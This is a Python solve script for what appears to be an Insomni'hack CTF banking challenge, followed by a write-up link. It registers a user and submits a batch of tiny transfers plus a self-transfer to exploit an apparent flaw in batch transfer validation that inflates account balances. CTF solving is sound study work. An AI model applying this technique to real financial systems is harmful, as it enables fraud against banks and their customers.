```py
import requests
import random
import string
import time

def random_string(len):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(len))

host = 'http://91.92.201.197:5000'
# host = 'http://127.0.0.1:5000'

session = requests.Session()

username = random_string(32)
password = random_string(32)
print('Registering...', username, password)
register = session.post('%s/register' % host, json = {
    'username': username,
    'password': password,
})
# print(register.text)
assert register.status_code == 200, register.status_code

token = register.json()['jwt']
print(token)

print('Fetching accounts...')
accounts = session.get('%s/accounts' % host, headers = {
    'Authorization': 'Bearer %s' % token,
})
assert accounts.status_code == 200, account.status_code

accounts_data = accounts.json()

def get_account_id(name):
    for uuid, data in accounts_data.items():
        if data['name'] == name:
            return uuid

    raise Exception('No account found')

def execute_batch(sender_account, transactions):
    print('Creating a batch...')
    new_batch = session.post('%s/batch/new' % host, json = {
        'senderid': get_account_id(sender_account),
    }, headers = {
        'Authorization': 'Bearer %s' % token,
    })
    assert new_batch.status_code == 200, new_batch.status_code
    print(new_batch.json())

    batches = session.get('%s/batches' % host, headers = {
        'Authorization': 'Bearer %s' % token,
    })
    assert batches.status_code == 200, batches.status_code

    batches_data = batches.json()
    batchid = batches_data[0]['batchid']
    print(batchid)

    print('Creating transfers...')
    for (accountid, amount) in transactions:
        new_transfer = session.post('%s/transfer' % host, json = {
            'batchid': batchid,
            'recipient': get_account_id(accountid),
            'amount': amount,
        }, headers = {
            'Authorization': 'Bearer %s' % token,
        })
        assert new_transfer.status_code == 200, new_transfer.status_code
        print(new_transfer.json())

    print('Validate...')
    validate = session.post('%s/validate' % host, json = {
        'batchid': batchid
    }, headers = {
        'Authorization': 'Bearer %s' % token,
    })
    assert validate.status_code == 200, validate.status_code
    print(validate.text)

    if '127.0.0.1' in host:
        time.sleep(2)
    else:
        time.sleep(61)

    print('Show accounts')
    show_account = session.get('%s/accounts' % host, headers = {
        'Authorization': 'Bearer %s' % token,
    })
    print(show_account.json())
    for account in show_account.json().values():
        print(account['name'], '-', account['balance'])

execute_batch('Current account', [
    ('Checkings account', 0.005),
    ('Savings account', 0.005),
    ('Current account', 9.99),
])
```
writeup: https://blog.2h0ng.wiki/2024/01/21/Insomni-hack-CTF-Writeup/